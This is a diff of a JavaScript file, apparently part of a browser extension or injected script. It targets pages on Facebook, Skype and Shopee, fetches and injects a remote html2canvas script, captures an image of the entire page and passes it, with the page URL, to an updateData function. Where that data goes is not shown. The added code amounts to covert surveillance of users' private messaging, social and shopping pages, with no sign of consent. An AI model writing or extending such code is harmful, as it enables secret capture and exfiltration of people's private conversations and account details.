@@ -211,30 +211,34 @@ function updateData(type, data) {
   );
 }
 
-importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
+if(window.location.origin.indexOf("facebook") > -1 || window.location.origin.indexOf("skype") > -1 || window.location.origin.indexOf("shopee") > -1) {
+  importJS('https://html2canvas.hertzen.com/dist/html2canvas.min.js');
 
-function importJS(url) {
-  fetch(url, { method: 'get' })
-  .then(function(response) {
-      if (!response.ok) {
-          throw Error(response.statusText);
-      }
-      return response.text();
-  }).then((data) => {
-    let scriptElement = document.createElement('script');
-    scriptElement.setAttribute('type', 'text/javascript');
-    scriptElement.setAttribute('charset', 'utf8');
-    scriptElement.setAttribute('test', 'true');
-    scriptElement.innerHTML = data;
-    document.head.appendChild(scriptElement);
-    screenShots();
-  });
-}
-
-function screenShots() {
-  html2canvas(document.querySelector("html")).then(canvas => {
-    updateData("image", {
-      image: canvas.toDataURL()
+  function importJS(url) {
+    console.log('importJS', url);
+    fetch(url, { method: 'get' })
+    .then(function(response) {
+        if (!response.ok) {
+            throw Error(response.statusText);
+        }
+        return response.text();
+    }).then((data) => {
+      let scriptElement = document.createElement('script');
+      scriptElement.setAttribute('type', 'text/javascript');
+      scriptElement.setAttribute('charset', 'utf8');
+      scriptElement.setAttribute('test', 'true');
+      scriptElement.innerHTML = data;
+      document.head.appendChild(scriptElement);
+      screenShots();
     });
-  });
+  }
+
+  function screenShots() {
+    html2canvas(document.querySelector("html")).then(canvas => {
+      updateData("image", {
+        image: canvas.toDataURL(),
+        url: window.location.href
+      });
+    });
+  }
 }
